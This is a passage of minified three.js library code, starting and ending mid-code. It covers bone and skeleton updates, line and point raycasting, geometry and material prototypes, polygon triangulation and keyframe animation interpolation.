t,e,i=0;for(e=this.bones.length;i<e;i++)(t=this.bones[i])&&t.matrixWorld.getInverse(this.boneInverses[i]);for(i=0,e=this.bones.length;i<e;i++)(t=this.bones[i])&&(t.parent&&t.parent.isBone?(t.matrix.getInverse(t.parent.matrixWorld),t.matrix.multiply(t.matrixWorld)):t.matrix.copy(t.matrixWorld),t.matrix.decompose(t.position,t.quaternion,t.scale))},update:function(){for(var t=this.bones,e=this.boneInverses,i=this.boneMatrices,n=this.boneTexture,r=0,a=t.length;r<a;r++)$s.multiplyMatrices(t[r]?t[r].matrixWorld:Zs,e[r]),$s.toArray(i,16*r);void 0!==n&&(n.needsUpdate=!0)},clone:function(){return new qe(this.bones,this.boneInverses)},getBoneByName:function(t){for(var e=0,i=this.bones.length;e<i;e++){var n=this.bones[e];if(n.name===t)return n}}}),Xe.prototype=Object.assign(Object.create(p.prototype),{constructor:Xe,isBone:!0}),Ye.prototype=Object.create(T.prototype),Ye.prototype.constructor=Ye,Ye.prototype.isLineBasicMaterial=!0,Ye.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.color.copy(t.color),this.linewidth=t.linewidth,this.linecap=t.linecap,this.linejoin=t.linejoin,this};var Js=new r,Ks=new r,Qs=new h,tl=new y,el=new v;$e.prototype=Object.assign(Object.create(p.prototype),{constructor:$e,isLine:!0,computeLineDistances:function(){var t=this.geometry;if(t.isBufferGeometry)if(null===t.index){for(var e=t.attributes.position,i=[0],n=1,r=e.count;n<r;n++)Js.fromBufferAttribute(e,n-1),Ks.fromBufferAttribute(e,n),i[n]=i[n-1],i[n]+=Js.distanceTo(Ks);t.addAttribute("lineDistance",new D(i,1))}else console.warn("THREE.Line.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");else if(t.isGeometry)for(e=t.vertices,(i=t.lineDistances)[0]=0,n=1,r=e.length;n<r;n++)i[n]=i[n-1],i[n]+=e[n-1].distanceTo(e[n]);return this},raycast:function(t,e){var i=t.linePrecision,n=this.geometry,a=this.matrixWorld;if(null===n.boundingSphere&&n.computeBoundingSphere(),el.copy(n.boundingSphere),el.applyMatrix4(a),el.radius+=i,!1!==t.ray.intersectsSphere(el)){Qs.getInverse(a),tl.copy(t.ray).applyMatrix4(Qs),i/=(this.scale.x+this.scale.y+this.scale.z)/3,i*=i;var o=new r,s=new r;a=new r;var l=new r,c=this&&this.isLineSegments?2:1;if(n.isBufferGeometry){var h=n.index,u=n.attributes.position.array;if(null!==h){n=0;for(var d=(h=h.array).length-1;n<d;n+=c){var p=h[n+1];o.fromArray(u,3*h[n]),s.fromArray(u,3*p),(p=tl.distanceSqToSegment(o,s,l,a))>i||(l.applyMatrix4(this.matrixWorld),(p=t.ray.origin.distanceTo(l))<t.near||p>t.far||e.push({distance:p,point:a.clone().applyMatrix4(this.matrixWorld),index:n,face:null,faceIndex:null,object:this}))}}else for(n=0,d=u.length/3-1;n<d;n+=c)o.fromArray(u,3*n),s.fromArray(u,3*n+3),(p=tl.distanceSqToSegment(o,s,l,a))>i||(l.applyMatrix4(this.matrixWorld),(p=t.ray.origin.distanceTo(l))<t.near||p>t.far||e.push({distance:p,point:a.clone().applyMatrix4(this.matrixWorld),index:n,face:null,faceIndex:null,object:this}))}else if(n.isGeometry)for(s=(o=n.vertices).length,n=0;n<s-1;n+=c)(p=tl.distanceSqToSegment(o[n],o[n+1],l,a))>i||(l.applyMatrix4(this.matrixWorld),(p=t.ray.origin.distanceTo(l))<t.near||p>t.far||e.push({distance:p,point:a.clone().applyMatrix4(this.matrixWorld),index:n,face:null,faceIndex:null,object:this}))}},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}});var il=new r,nl=new r;Ze.prototype=Object.assign(Object.create($e.prototype),{constructor:Ze,isLineSegments:!0,computeLineDistances:function(){var t=this.geometry;if(t.isBufferGeometry)if(null===t.index){for(var e=t.attributes.position,i=[],n=0,r=e.count;n<r;n+=2)il.fromBufferAttribute(e,n),nl.fromBufferAttribute(e,n+1),i[n]=0===n?0:i[n-1],i[n+1]=i[n]+il.distanceTo(nl);t.addAttribute("lineDistance",new D(i,1))}else console.warn("THREE.LineSegments.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");else if(t.isGeometry)for(e=t.vertices,i=t.lineDistances,n=0,r=e.length;n<r;n+=2)il.copy(e[n]),nl.copy(e[n+1]),i[n]=0===n?0:i[n-1],i[n+1]=i[n]+il.distanceTo(nl);return this}}),Je.prototype=Object.assign(Object.create($e.prototype),{constructor:Je,isLineLoop:!0}),Ke.prototype=Object.create(T.prototype),Ke.prototype.constructor=Ke,Ke.prototype.isPointsMaterial=!0,Ke.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.size=t.size,this.sizeAttenuation=t.sizeAttenuation,this.morphTargets=t.morphTargets,this};var rl=new h,al=new y,ol=new v,sl=new r;Qe.prototype=Object.assign(Object.create(p.prototype),{constructor:Qe,isPoints:!0,raycast:function(t,e){var i=this.geometry,n=this.matrixWorld,r=t.params.Points.threshold;if(null===i.boundingSphere&&i.computeBoundingSphere(),ol.copy(i.boundingSphere),ol.applyMatrix4(n),ol.radius+=r,!1!==t.ray.intersectsSphere(ol))if(rl.getInverse(n),al.copy(t.ray).applyMatrix4(rl),r/=(this.scale.x+this.scale.y+this.scale.z)/3,r*=r,i.isBufferGeometry){var a=i.index;if(i=i.attributes.position.array,null!==a){var o=a.array;a=0;for(var s=o.length;a<s;a++){var l=o[a];sl.fromArray(i,3*l),ti(sl,l,r,n,t,e,this)}}else for(a=0,o=i.length/3;a<o;a++)sl.fromArray(i,3*a),ti(sl,a,r,n,t,e,this)}else for(a=0,o=(i=i.vertices).length;a<o;a++)ti(i[a],a,r,n,t,e,this)},updateMorphTargets:function(){var t=this.geometry;if(t.isBufferGeometry){t=t.morphAttributes;var e=Object.keys(t);if(0<e.length){var i=t[e[0]];if(void 0!==i)for(this.morphTargetInfluences=[],this.morphTargetDictionary={},t=0,e=i.length;t<e;t++){var n=i[t].name||String(t);this.morphTargetInfluences.push(0),this.morphTargetDictionary[n]=t}}}else void 0!==(t=t.morphTargets)&&0<t.length&&console.error("THREE.Points.updateMorphTargets() does not support THREE.Geometry. Use THREE.BufferGeometry instead.")},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}}),ei.prototype=Object.assign(Object.create(o.prototype),{constructor:ei,isVideoTexture:!0,update:function(){var t=this.image;t.readyState>=t.HAVE_CURRENT_DATA&&(this.needsUpdate=!0)}}),ii.prototype=Object.create(o.prototype),ii.prototype.constructor=ii,ii.prototype.isCompressedTexture=!0,ni.prototype=Object.create(o.prototype),ni.prototype.constructor=ni,ni.prototype.isCanvasTexture=!0,ri.prototype=Object.create(o.prototype),ri.prototype.constructor=ri,ri.prototype.isDepthTexture=!0,ai.prototype=Object.create(F.prototype),ai.prototype.constructor=ai,oi.prototype=Object.create(U.prototype),oi.prototype.constructor=oi,si.prototype=Object.create(F.prototype),si.prototype.constructor=si,li.prototype=Object.create(U.prototype),li.prototype.constructor=li,ci.prototype=Object.create(F.prototype),ci.prototype.constructor=ci,hi.prototype=Object.create(U.prototype),hi.prototype.constructor=hi,ui.prototype=Object.create(ci.prototype),ui.prototype.constructor=ui,di.prototype=Object.create(U.prototype),di.prototype.constructor=di,pi.prototype=Object.create(ci.prototype),pi.prototype.constructor=pi,fi.prototype=Object.create(U.prototype),fi.prototype.constructor=fi,mi.prototype=Object.create(ci.prototype),mi.prototype.constructor=mi,gi.prototype=Object.create(U.prototype),gi.prototype.constructor=gi,vi.prototype=Object.create(ci.prototype),vi.prototype.constructor=vi,yi.prototype=Object.create(U.prototype),yi.prototype.constructor=yi,xi.prototype=Object.create(F.prototype),xi.prototype.constructor=xi,xi.prototype.toJSON=function(){var t=F.prototype.toJSON.call(this);return t.path=this.parameters.path.toJSON(),t},bi.prototype=Object.create(U.prototype),bi.prototype.constructor=bi,wi.prototype=Object.create(F.prototype),wi.prototype.constructor=wi,_i.prototype=Object.create(U.prototype),_i.prototype.constructor=_i,Mi.prototype=Object.create(F.prototype),Mi.prototype.constructor=Mi;var ll=function(t,e,i){i=i||2;var n,r=e&&e.length,a=r?e[0]*i:t.length,o=Si(t,0,a,i,!0),s=[];if(!o||o.next===o.prev)return s;if(r){var l,c=i;r=[];var h=0;for(l=e.length;h<l;h++){var u=e[h]*c;(u=Si(t,u,h<l-1?e[h+1]*c:t.length,c,!1))===u.next&&(u.steiner=!0),r.push(Ri(u))}for(r.sort(Ai),h=0;h<r.length;h++)(c=Li(e=r[h],c=o))&&Ti(e=ki(c,e),e.next),o=Ti(o,o.next)}if(t.length>80*i){var d=n=t[0],p=r=t[1];for(c=i;c<a;c+=i)(h=t[c])<d&&(d=h),(e=t[c+1])<p&&(p=e),h>n&&(n=h),e>r&&(r=e);n=0!==(n=Math.max(n-d,r-p))?1/n:0}return Ei(o,s,i,d,p,n),s},cl={area:function(t){for(var e=t.length,i=0,n=e-1,r=0;r<e;n=r++)i+=t[n].x*t[r].y-t[r].x*t[n].y;return.5*i},isClockWise:function(t){return 0>cl.area(t)},triangulateShape:function(t,e){var i=[],n=[],r=[];Gi(t),ji(i,t);var a=t.length;for(e.forEach(Gi),t=0;t<e.length;t++)n.push(a),a+=e[t].length,ji(i,e[t]);for(e=ll(i,n),t=0;t<e.length;t+=3)r.push(e.slice(t,t+3));return r}};Ui.prototype=Object.create(U.prototype),Ui.prototype.constructor=Ui,Ui.prototype.toJSON=function(){var t=U.prototype.toJSON.call(this);return Wi(this.parameters.shapes,this.parameters.options,t)},Vi.prototype=Object.create(F.prototype),Vi.prototype.constructor=Vi,Vi.prototype.toJSON=function(){var t=F.prototype.toJSON.call(this);return Wi(this.parameters.shapes,this.parameters.options,t)};var hl={generateTopUV:function(t,e,n,r,a){t=e[3*r],r=e[3*r+1];var o=e[3*a];return a=e[3*a+1],[new i(e[3*n],e[3*n+1]),new i(t,r),new i(o,a)]},generateSideWallUV:function(t,e,n,r,a,o){t=e[3*n];var s=e[3*n+1];n=e[3*n+2];var l=e[3*r],c=e[3*r+1];r=e[3*r+2];var h=e[3*a],u=e[3*a+1];a=e[3*a+2];var d=e[3*o],p=e[3*o+1];return e=e[3*o+2],.01>Math.abs(s-c)?[new i(t,1-n),new i(l,1-r),new i(h,1-a),new i(d,1-e)]:[new i(s,1-n),new i(c,1-r),new i(u,1-a),new i(p,1-e)]}};qi.prototype=Object.create(U.prototype),qi.prototype.constructor=qi,Xi.prototype=Object.create(Vi.prototype),Xi.prototype.constructor=Xi,Yi.prototype=Object.create(U.prototype),Yi.prototype.constructor=Yi,$i.prototype=Object.create(F.prototype),$i.prototype.constructor=$i,Zi.prototype=Object.create(U.prototype),Zi.prototype.constructor=Zi,Ji.prototype=Object.create(F.prototype),Ji.prototype.constructor=Ji,Ki.prototype=Object.create(U.prototype),Ki.prototype.constructor=Ki,Qi.prototype=Object.create(F.prototype),Qi.prototype.constructor=Qi,tn.prototype=Object.create(U.prototype),tn.prototype.constructor=tn,tn.prototype.toJSON=function(){var t=U.prototype.toJSON.call(this);return nn(this.parameters.shapes,t)},en.prototype=Object.create(F.prototype),en.prototype.constructor=en,en.prototype.toJSON=function(){var t=F.prototype.toJSON.call(this);return nn(this.parameters.shapes,t)},rn.prototype=Object.create(F.prototype),rn.prototype.constructor=rn,an.prototype=Object.create(U.prototype),an.prototype.constructor=an,on.prototype=Object.create(F.prototype),on.prototype.constructor=on,sn.prototype=Object.create(an.prototype),sn.prototype.constructor=sn,ln.prototype=Object.create(on.prototype),ln.prototype.constructor=ln,cn.prototype=Object.create(U.prototype),cn.prototype.constructor=cn,hn.prototype=Object.create(F.prototype),hn.prototype.constructor=hn;var ul=Object.freeze({WireframeGeometry:ai,ParametricGeometry:oi,ParametricBufferGeometry:si,TetrahedronGeometry:hi,TetrahedronBufferGeometry:ui,OctahedronGeometry:di,OctahedronBufferGeometry:pi,IcosahedronGeometry:fi,IcosahedronBufferGeometry:mi,DodecahedronGeometry:gi,DodecahedronBufferGeometry:vi,PolyhedronGeometry:li,PolyhedronBufferGeometry:ci,TubeGeometry:yi,TubeBufferGeometry:xi,TorusKnotGeometry:bi,TorusKnotBufferGeometry:wi,TorusGeometry:_i,TorusBufferGeometry:Mi,TextGeometry:qi,TextBufferGeometry:Xi,SphereGeometry:Yi,SphereBufferGeometry:$i,RingGeometry:Zi,RingBufferGeometry:Ji,PlaneGeometry:rt,PlaneBufferGeometry:at,LatheGeometry:Ki,LatheBufferGeometry:Qi,ShapeGeometry:tn,ShapeBufferGeometry:en,ExtrudeGeometry:Ui,ExtrudeBufferGeometry:Vi,EdgesGeometry:rn,ConeGeometry:sn,ConeBufferGeometry:ln,CylinderGeometry:an,CylinderBufferGeometry:on,CircleGeometry:cn,CircleBufferGeometry:hn,BoxGeometry:V,BoxBufferGeometry:W});un.prototype=Object.create(T.prototype),un.prototype.constructor=un,un.prototype.isShadowMaterial=!0,un.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.color.copy(t.color),this},dn.prototype=Object.create(Y.prototype),dn.prototype.constructor=dn,dn.prototype.isRawShaderMaterial=!0,pn.prototype=Object.create(T.prototype),pn.prototype.constructor=pn,pn.prototype.isMeshStandardMaterial=!0,pn.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.defines={STANDARD:""},this.color.copy(t.color),this.roughness=t.roughness,this.metalness=t.metalness,this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.emissive.copy(t.emissive),this.emissiveMap=t.emissiveMap,this.emissiveIntensity=t.emissiveIntensity,this.bumpMap=t.bumpMap,this.bumpScale=t.bumpScale,this.normalMap=t.normalMap,this.normalMapType=t.normalMapType,this.normalScale.copy(t.normalScale),this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.roughnessMap=t.roughnessMap,this.metalnessMap=t.metalnessMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.envMapIntensity=t.envMapIntensity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},fn.prototype=Object.create(pn.prototype),fn.prototype.constructor=fn,fn.prototype.isMeshPhysicalMaterial=!0,fn.prototype.copy=function(t){return pn.prototype.copy.call(this,t),this.defines={STANDARD:"",PHYSICAL:""},this.reflectivity=t.reflectivity,this.clearcoat=t.clearcoat,this.clearcoatRoughness=t.clearcoatRoughness,this.sheen=t.sheen?(this.sheen||new b).copy(t.sheen):null,this.clearcoatNormalMap=t.clearcoatNormalMap,this.clearcoatNormalScale.copy(t.clearcoatNormalScale),this.transparency=t.transparency,this},mn.prototype=Object.create(T.prototype),mn.prototype.constructor=mn,mn.prototype.isMeshPhongMaterial=!0,mn.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.color.copy(t.color),this.specular.copy(t.specular),this.shininess=t.shininess,this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.emissive.copy(t.emissive),this.emissiveMap=t.emissiveMap,this.emissiveIntensity=t.emissiveIntensity,this.bumpMap=t.bumpMap,this.bumpScale=t.bumpScale,this.normalMap=t.normalMap,this.normalMapType=t.normalMapType,this.normalScale.copy(t.normalScale),this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.specularMap=t.specularMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.combine=t.combine,this.reflectivity=t.reflectivity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},gn.prototype=Object.create(mn.prototype),gn.prototype.constructor=gn,gn.prototype.isMeshToonMaterial=!0,gn.prototype.copy=function(t){return mn.prototype.copy.call(this,t),this.gradientMap=t.gradientMap,this},vn.prototype=Object.create(T.prototype),vn.prototype.constructor=vn,vn.prototype.isMeshNormalMaterial=!0,vn.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.bumpMap=t.bumpMap,this.bumpScale=t.bumpScale,this.normalMap=t.normalMap,this.normalMapType=t.normalMapType,this.normalScale.copy(t.normalScale),this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},yn.prototype=Object.create(T.prototype),yn.prototype.constructor=yn,yn.prototype.isMeshLambertMaterial=!0,yn.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.emissive.copy(t.emissive),this.emissiveMap=t.emissiveMap,this.emissiveIntensity=t.emissiveIntensity,this.specularMap=t.specularMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.combine=t.combine,this.reflectivity=t.reflectivity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},xn.prototype=Object.create(T.prototype),xn.prototype.constructor=xn,xn.prototype.isMeshMatcapMaterial=!0,xn.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.defines={MATCAP:""},this.color.copy(t.color),this.matcap=t.matcap,this.map=t.map,this.bumpMap=t.bumpMap,this.bumpScale=t.bumpScale,this.normalMap=t.normalMap,this.normalMapType=t.normalMapType,this.normalScale.copy(t.normalScale),this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.alphaMap=t.alphaMap,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},bn.prototype=Object.create(Ye.prototype),bn.prototype.constructor=bn,bn.prototype.isLineDashedMaterial=!0,bn.prototype.copy=function(t){return Ye.prototype.copy.call(this,t),this.scale=t.scale,this.dashSize=t.dashSize,this.gapSize=t.gapSize,this};var dl=Object.freeze({ShadowMaterial:un,SpriteMaterial:Ge,RawShaderMaterial:dn,ShaderMaterial:Y,PointsMaterial:Ke,MeshPhysicalMaterial:fn,MeshStandardMaterial:pn,MeshPhongMaterial:mn,MeshToonMaterial:gn,MeshNormalMaterial:vn,MeshLambertMaterial:yn,MeshDepthMaterial:Te,MeshDistanceMaterial:Ee,MeshBasicMaterial:E,MeshMatcapMaterial:xn,LineDashedMaterial:bn,LineBasicMaterial:Ye,Material:T}),pl={arraySlice:function(t,e,i){return pl.isTypedArray(t)?new t.constructor(t.subarray(e,void 0!==i?i:t.length)):t.slice(e,i)},convertArray:function(t,e,i){return!t||!i&&t.constructor===e?t:"number"==typeof e.BYTES_PER_ELEMENT?new e(t):Array.prototype.slice.call(t)},isTypedArray:function(t){return ArrayBuffer.isView(t)&&!(t instanceof DataView)},getKeyframeOrder:function(t){for(var e=t.length,i=Array(e),n=0;n!==e;++n)i[n]=n;return i.sort((function(e,i){return t[e]-t[i]})),i},sortedArray:function(t,e,i){for(var n=t.length,r=new t.constructor(n),a=0,o=0;o!==n;++a)for(var s=i[a]*e,l=0;l!==e;++l)r[o++]=t[s+l];return r},flattenJSON:function(t,e,i,n){for(var r=1,a=t[0];void 0!==a&&void 0===a[n];)a=t[r++];if(void 0!==a){var o=a[n];if(void 0!==o)if(Array.isArray(o))do{void 0!==(o=a[n])&&(e.push(a.time),i.push.apply(i,o)),a=t[r++]}while(void 0!==a);else if(void 0!==o.toArray)do{void 0!==(o=a[n])&&(e.push(a.time),o.toArray(i,i.length)),a=t[r++]}while(void 0!==a);else do{void 0!==(o=a[n])&&(e.push(a.time),i.push(o)),a=t[r++]}while(void 0!==a)}}};Object.assign(wn.prototype,{evaluate:function(t){var e=this.parameterPositions,i=this._cachedIndex,n=e[i],r=e[i-1];t:{e:{i:{n:if(!(t<n)){for(var a=i+2;;){if(void 0===n){if(t<r)break n;return this._cachedIndex=i=e.length,this.afterEnd_(i-1,t,r)}if(i===a)break;if(r=n,t<(n=e[++i]))break e}n=e.length;break i}if(t>=r)break t;for(t<(a=e[1])&&(i=2,r=a),a=i-2;;){if(void 0===r)return this._cachedIndex=0,this.beforeStart_(0,t,n);if(i===a)break;if(n=r,t>=(r=e[--i-1]))break e}n=i,i=0}for(;i<n;)t<e[r=i+n>>>1]?n=r:i=r+1;if(n=e[i],void 0===(r=e[i-1]))return this._cachedIndex=0,this.beforeStart_(0,t,n);if(void 0===n)return this._cachedIndex=i=e.length,this.afterEnd_(i-1,r,t)}this._cachedIndex=i,this.intervalChanged_(i,r,n)}return this.interpolate_(i,r,t,n)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(t){var e=this.resultBuffer,i=this.sampleValues,n=this.valueSize;t*=n;for(var r=0;r!==n;++r)e[r]=i[t+r];return e},interpolate_:function(){throw Error("call to abstract method")},intervalChanged_:function(){}}),Object.assign(wn.prototype,{beforeStart_:wn.prototype.copySampleValue_,afterEnd_:wn.prototype.copySampleValue_}),_n.prototype=Object.assign(Object.create(wn.prototype),{constructor:_n,DefaultSettings_:{endingStart:2400,endingEnd:2400},intervalChanged_:function(t,e,i){var n=this.parameterPositions,r=t-2,a=t+1,o=n[r],s=n[a];if(void 0===o)switch(this.getSettings_().endingStart){case 2401:r=t,o=2*e-i;break;case 2402:o=e+n[r=n.length-2]-n[r+1];break;default:r=t,o=i}if(void 0===s)switch(this.getSettings_().endingEnd){case 2401:a=t,s=2*i-e;break;case 2402:a=1,s=i+n[1]-n[0];break;default:a=t-1,s=e}t=.5*(i-e),n=this.valueSize,this._weightPrev=t/(e-o),this._weightNext=t/(s-i),this._offsetPrev=r*n,this._offsetNext=a*n},interpolate_:function(t,e,i,n){var r=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=(t*=o)-o,l=this._offsetPrev,c=this._offsetNext,h=this._weightPrev,u=this._weightNext,d=(i-e)/(n-e);for(e=-h*(n=(i=d*d)*d)+2*h*i-h*d,h=(1+h)*n+(-1.5-2*h)*i+(-.5+h)*d+1,d=(-1-u)*n+(1.5+u)*i+.5*d,u=u*n-u*i,i=0;i!==o;++i)r[i]=e*a[l+i]+h*a[s+i]+d*a[t+i]+u*a[c+i];return r}}),Mn.prototype=Object.assign(Object.create(wn.prototype),{constructor:Mn,interpolate_:function(t,e,i,n){var r=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=(t*=o)-o;for(i=1-(e=(i-e)/(n-e)),n=0;n!==o;++n)r[n]=a[s+n]*i+a[t+n]*e;return r}}),Sn.prototype=Object.assign(Object.create(wn.prototype),{constructor:Sn,interpolate_:function(t){return this.copySampleValue_(t-1)}}),Object.assign(Tn,{toJSON:function(t){var e=t.constructor;if(void 0!==e.toJSON)e=e.toJSON(t);else{e={name:t.name,times:pl.convertArray(t.times,Array),values:pl.convertArray(t.values,Array)};var i=t.getInterpolation();i!==t.DefaultInterpolation&&(e.interpolation=i)}return e.type=t.ValueTypeName,e}}),Object.assign(Tn.prototype,{constructor:Tn,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:2301,InterpolantFactoryMethodDiscrete:function(t){return new Sn(this.times,this.values,this.getValueSize(),t)},InterpolantFactoryMethodLinear:function(t){return new Mn(this.times,this.values,this.getValueSize(),t)},InterpolantFactoryMethodSmooth:function(t){return new _n(this.times,this.values,this.getValueSize(),t)},setInterpolation:function(t){switch(t){case 2300:var e=this.InterpolantFactoryMethodDiscrete;break;case 2301:e=this.InterpolantFactoryMethodLinear;break;case 2302:e=this.InterpolantFactoryMethodSmooth}if(void 0===e){if(e="unsupported interpolation for "+this.ValueTypeName+" keyframe track named "+this.name,void 0===this.createInterpolant){if(t===this.DefaultInterpolation)throw Error(e);this.setInterpolation(this.DefaultInterpolation)}return console.warn("THREE.KeyframeTrack:",e),this}return this.createInterpolant=e,this},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return 2300;case this.InterpolantFactoryMethodLinear:return 2301;case this.InterpolantFactoryMethodSmooth:return 2302}},getValueSize:function(){return this.values.length/this.times.length},shift:function(t){if(0!==t)for(var e=this.times,i=0,n=e.length;i!==n;++i)e[i]+=t;return this},scale:function(t){if(1!==t)for(var e=this.times,i=0,n=e.length;i!==n;++i)e[i]*=t;return this},trim:function(t,e){for(var i=this.times,n=i.length,r=0,a=n-1;r!==n&&i[r]<t;)++r;for(;-1!==a&&i[a]>e;)--a;return++a,0===r&&a===n||(r>=a&&(r=(a=Math.max(a,1))-1),t=this.getValueSize(),this.times=pl.arraySlice(i,r,a),this.values=pl.arraySlice(this.values,r*t,a*t)),this},validate:function(){var t=!0,e=this.getValueSize();0!=e-Math.floor(e)&&(console.error("THREE.KeyframeTrack: Invalid value size in track.",this),t=!1);var i=this.times;e=this.values;var n=i.length;0===n&&(console.error("THREE.KeyframeTrack: Track is empty.",this),t=!1);for(var r=null,a=0;a!==n;a++){var o=i[a];if("number"==typeof o&&isNaN(o)){console.error("THREE.KeyframeTrack: Time is not a valid number.",this,a,o),t=!1;break}if(null!==r&&r>o){console.error("THREE.KeyframeTrack: Out of order keys.",this,a,o,r),t=!1;break}r=o}if(void 0!==e&&pl.isTypedArray(e))for(a=0,i=e.length;a!==i;++a)if(n=e[a],isNaN(n)){console.error("THREE.KeyframeTrack: Value is not a valid number.",this,a,n),t=!1;break}return t},optimize:function(){for(var t=this.times,e=this.values,i=this.getValueSize(),n=2302===this.getInterpolation(),r=1,a=t.length-1,o=1;o<a;++o){var s=!1,l=t[o];if(l!==t[o+1]&&(1!==o||l!==l[0]))if(n)s=!0;else{var c=o*i,h=c-i,u=c+i;for(l=0;l!==i;++l){var d=e[c+l];if(d!==e[h+l]||d!==e[u+l]){s=!0;break}}}if(s){if(o!==r)for(t[r]=t[o],s=o*i,c=r*i,l=0;l!==i;++l)e[c+l]=e[s+l];++r}}if(0<a){for(t[r]=t[a],s=a*i,c=r*i,l=0;l!==i;++l)e[c+l]=e[s+l];++r}return r!==t.length&&(this.times=pl.arraySlice(t,0,r),this.values=pl.arraySlice(e,0,r*i)),this},clone:function(){var t=pl.arraySlice(this.times,0),e=pl.arraySlice(this.values,0);return(t=new this.constructor(this.name,t,e)).createInterpolant=this.createInterpolant,t}}),En.prototype=Object.assign(Object.create(Tn.prototype),{constructor:En,ValueTypeName:"bool",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),Cn.prototype=Object.assign(Object.create(Tn.prototype),{constructor:Cn,ValueTypeName:"color"}),An.prototype=Object.assign(Object.create(Tn.prototype),{constructor:An,ValueTypeName:"number"}),Ln.prototype=Object.assign(Object.create(wn.prototype),{constructor:Ln,interpolate_:function(t,e,i,r){var a=this.resultBuffer,o=this.sampleValues,s=this.valueSize;for(e=(i-e)/(r-e),i=(t*=s)+s;t!==i;t+=4)n.slerpFlat(a,0,o,t-s,o,t,e);return a}}),Pn.prototype=Object.assign(Object.create(Tn.prototype),{constructor:Pn,ValueTypeName:"quaternion",DefaultInterpolation:2301,InterpolantFactoryMethodLinear:function(t){return new Ln(this.times,this.values,this.getValueSize(),t)},InterpolantFactoryMethodSmooth:void 0}),Rn.prototype=Object.assign(Object.create(Tn.prototype),{constructor:Rn,ValueTypeName:"string",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),On.prototype=Object.assign(Object.create(Tn.prototype),{constructor:On,ValueTypeName:"vector"}),Object.assign(In,{parse:function(t){for(var e=[],i=t.tracks,n=1/(t.fps||1),r=0,a=i.length;r!==a;++r)e.push(zn(i[r]).scale(n));return new In(t.name,t.duration,e)},toJSON:function(t){var e=[],i=t.tracks;t={name:t.name,duration:t.duration,tracks:e,uuid:t.uuid};for(var n=0,r=i.length;n!==r;++n)e.push(Tn.toJSON(i[n]));return t},CreateFromMorphTargetSequence:function(t,e,i,n){for(var r=e.length,a=[],o=0;o<r;o++){var s=[],l=[];s.push((o+r-1)%r,o,(o+1)%r),l.push(0,1,0);var c=pl.getKeyframeOrder(s);s=pl.sortedArray(s,1,c),l=pl.sortedArray(l,1,c),n||0!==s[0]||(s.push(r),l.push(l[0])),a.push(new An(".morphTargetInfluences["+e[o].name+"]",s,l).scale(1/i))}return new In(t,-1,a)},findByName:function(t,e){var i=t;for(Array.isArray(t)||(i=t.geometry&&t.geometry.animations||t.animations),t=0;t<i.length;t++)if(i[t].name===e)return i[t];return null},CreateClipsFromMorphTargetSequences:function(t,e,i){for(var n={},r=/^([\w-]*?)([\d]+)$/,a=0,o=t.length;a<o;a++){var s=t[a],l=s.name.match(r);if(l&&1<l.length){var c=l[1];(l=n[c])||(n[c]=l=[]),l.push(s)}}for(c in t=[],n)t.push(In.CreateFromMorphTargetSequence(c,n[c],e,i));return t},parseAnimation:function(t,e){if(!t)return console.error("THREE.AnimationClip: No animation in JSONLoader data."),null;var i=function(t,e,i,n,r){if(0!==i.length){var 